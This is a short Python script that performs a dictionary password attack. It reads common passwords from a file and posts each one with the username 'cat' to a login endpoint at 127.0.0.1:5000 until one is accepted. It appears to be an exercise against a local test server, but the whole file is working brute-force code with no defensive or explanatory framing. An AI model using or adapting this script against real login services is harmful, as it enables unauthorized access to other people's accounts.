from random import *
import requests

with open('bad_password.txt') as f:
    popular_passwords_data = f.read()

popular_passwords = popular_passwords_data.split('\n')

def generate_bad_password():
    global i
    if i >= len(popular_passwords):
        return
    return popular_passwords[i]

i = 0

while True:
    password = generate_bad_password()
    i += 1
    if password is None:
        break

    data = {'login': 'cat', 'password': password}
    response = requests.post('http://127.0.0.1:5000/auth', json=data)

    if response.status_code == 200:
        print('Successs', password) # data
        break
